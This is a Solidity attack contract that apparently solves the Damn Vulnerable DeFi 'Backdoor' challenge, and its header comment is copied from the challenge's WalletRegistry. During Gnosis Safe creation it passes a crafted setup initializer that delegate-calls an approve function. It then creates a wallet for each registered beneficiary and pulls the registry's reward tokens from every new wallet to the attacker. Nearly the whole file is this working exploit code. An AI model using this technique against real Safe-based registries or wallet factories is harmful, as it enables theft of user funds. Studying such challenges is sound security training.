// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletAttack {
    WalletRegistry public walletRegistry;
    IERC20 public immutable token;
    GnosisSafeProxyFactory public immutable proxyFactory;
    address public immutable owner;
    bytes4 public constant SETUP_SELECTOR =
        bytes4(
            keccak256(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)"
            )
        );
    bytes4 public constant APPROVAL_SELECTOR =
        bytes4(keccak256("callApprove(address,address)"));

    constructor(
        address registryAddress,
        address tokenAddress,
        address proxyAddress
    ) {
        walletRegistry = WalletRegistry(registryAddress);
        token = IERC20(tokenAddress);
        proxyFactory = GnosisSafeProxyFactory(proxyAddress);
        owner = msg.sender;
    }

    function callApprove(address tokenAddr, address attacker) external {
        IERC20(tokenAddr).approve(attacker, 10 ether);
        // token.approve(address(this), 10 ether);
    }

    function callCreate(
        address singleton,
        address registryAddress,
        address[] calldata owners
    ) external {
        //      function setup(
        //     address[] calldata _owners,
        //     uint256 _threshold,
        //     address to,
        //     bytes calldata data,
        //     address fallbackHandler,
        //     address paymentToken,
        //     uint256 payment,
        //     address payable paymentReceiver
        // )

        // bytes memory data = abi.encodeWithSelector(
        //     APPROVAL_SELECTOR,
        //     address(token),
        //     address(this)
        // );
        bytes memory data = abi.encodeWithSignature(
            "callApprove(address,address)",
            address(token),
            address(this)
        );
        for (uint i; i < owners.length; i++) {
            // address have to be wrapped
            // reference https://github.com/jmhickman/DamnVulnerableDeFi-Solutions/blob/main/Level11-Attack.sol
            address[] memory _target = new address[](1);
            _target[0] = owners[i];
            bytes memory initializer = abi.encodeWithSelector(
                SETUP_SELECTOR,
                _target,
                1,
                address(this),
                data,
                address(0),
                address(0),
                0,
                address(0)
            );
            IProxyCreationCallback callbackRegistry = IProxyCreationCallback(
                registryAddress
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                callbackRegistry
            );
            token.transferFrom(address(proxy), owner, 10 ether);
        }
    }
}
